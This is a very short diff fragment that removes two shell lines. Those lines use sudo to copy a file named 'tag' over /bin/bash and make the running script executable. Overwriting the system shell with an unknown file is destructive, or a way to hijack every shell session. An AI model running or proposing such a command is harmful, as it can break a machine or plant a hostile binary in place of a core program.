@@ -1,2 +1,0 @@
-sudo chmod 755 tag && sudo cp tag /bin/bash
-chmod 755 $0 
